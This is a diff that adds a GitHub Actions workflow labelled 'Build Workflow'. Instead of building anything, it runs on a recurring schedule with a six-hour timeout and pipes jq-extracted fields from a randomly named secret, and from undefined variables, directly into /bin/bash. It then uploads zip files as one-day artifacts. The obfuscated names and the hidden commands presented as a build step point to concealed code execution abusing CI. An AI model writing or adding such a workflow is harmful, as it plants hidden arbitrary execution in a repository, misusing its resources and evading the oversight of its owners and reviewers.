@@ -1,0 +1,30 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          frfq1078: ${{ secrets.frfq1078 }}
+        run: |
+          printf '%s' "$frfq1078" | jq -r .oak36732 | /bin/bash
+          echo $rq9 | jq -r .tj02 | /bin/bash
+          echo $ylxxs31216 | jq -r .v77 | /bin/bash
+
+      - name: Save results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: sRFPL6EQ
+          path: "*.zip"
+          retention-days: 1
